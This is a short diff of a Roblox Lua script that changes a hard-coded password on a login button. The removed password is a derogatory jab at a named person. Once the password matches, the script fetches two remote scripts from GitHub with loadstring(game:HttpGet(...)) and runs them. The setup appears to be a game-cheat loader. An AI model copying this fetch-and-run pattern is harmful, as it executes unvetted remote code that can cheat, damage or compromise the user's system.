@@ -39,7 +39,7 @@ TextButton.Text = "LOGIN"
 TextButton.TextColor3 = Color3.fromRGB(255, 5, 9)
 TextButton.TextSize = 50.000
 TextButton.MouseButton1Click:Connect(function()
-    if TextBox.Text == "pitch is gay" then
+    if TextBox.Text == "perkys OWO" then
         zzz:Destroy()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/kill'))()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/right'))()
